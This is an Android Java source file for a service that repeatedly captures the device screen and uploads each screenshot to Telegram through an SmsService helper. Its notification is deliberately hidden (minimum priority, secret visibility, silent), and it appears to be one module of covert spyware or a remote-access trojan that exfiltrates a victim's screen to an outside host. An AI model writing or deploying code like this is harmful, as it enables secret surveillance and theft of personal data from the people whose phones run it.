package com.smshandler;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {

    static int     sResultCode   = 0;
    static Intent  sResultData   = null;
    static boolean sContinuous   = false;
    static int     sIntervalSec  = 30;

    private MediaProjection mProjection;
    private VirtualDisplay  mDisplay;
    private ImageReader     mReader;
    private Handler         mHandler;
    private HandlerThread   mThread;
    private volatile boolean mRunning = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "STOP".equals(intent.getAction())) {
            stopCapture();
            return START_NOT_STICKY;
        }
        startForeground(9904, buildNotif());
        mThread = new HandlerThread("ScreenCap");
        mThread.start();
        mHandler = new Handler(mThread.getLooper());
        mHandler.post(this::initProjection);
        return START_NOT_STICKY;
    }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, SmsService.CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true).build();
    }

    private void initProjection() {
        try {
            MediaProjectionManager mgr = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mProjection = mgr.getMediaProjection(sResultCode, sResultData);

            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(dm);
            int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

            mReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            mDisplay = mProjection.createVirtualDisplay("ScreenCap",
                w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mReader.getSurface(), null, null);

            mRunning = true;
            captureLoop();
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screen capture init failed: " + e.getMessage());
            stopCapture();
        }
    }

    private void captureLoop() {
        if (!mRunning) return;
        try { Thread.sleep(600); } catch (InterruptedException e) { return; }
        takeScreenshot();
        if (sContinuous && mRunning) {
            mHandler.postDelayed(this::captureLoop, sIntervalSec * 1000L);
        } else {
            stopCapture();
        }
    }

    private void takeScreenshot() {
        try {
            Image img = mReader.acquireLatestImage();
            if (img == null) {
                SmsService.sendRawMessage("❌ Screenshot: no frame captured.");
                return;
            }
            Image.Plane[] planes = img.getPlanes();
            ByteBuffer buf = planes[0].getBuffer();
            int w = img.getWidth(), h = img.getHeight();
            int rowStride = planes[0].getRowStride();
            int pixelStride = planes[0].getPixelStride();

            Bitmap bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            img.close();

            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
            bmp.recycle();

            // Scale down to 720p max
            int maxW = 720;
            if (cropped.getWidth() > maxW) {
                float scale = (float) maxW / cropped.getWidth();
                Bitmap scaled = Bitmap.createScaledBitmap(cropped, maxW,
                    (int)(cropped.getHeight() * scale), true);
                cropped.recycle();
                cropped = scaled;
            }

            File f = new File(getCacheDir(), "screen_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(f);
            cropped.compress(Bitmap.CompressFormat.JPEG, 75, fos);
            fos.close();
            cropped.recycle();

            SmsService.sendPhotoToTelegram(f, "📱 Screenshot");
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screenshot failed: " + e.getMessage());
        }
    }

    private void stopCapture() {
        mRunning = false;
        if (mDisplay   != null) { mDisplay.release();   mDisplay   = null; }
        if (mProjection!= null) { mProjection.stop();   mProjection= null; }
        if (mReader    != null) { mReader.close();       mReader    = null; }
        if (mThread    != null) { mThread.quit();        mThread    = null; }
        stopForeground(true);
        stopSelf();
    }

    @Override public void onDestroy() { stopCapture(); super.onDestroy(); }
    @Override public IBinder onBind(Intent i) { return null; }
}
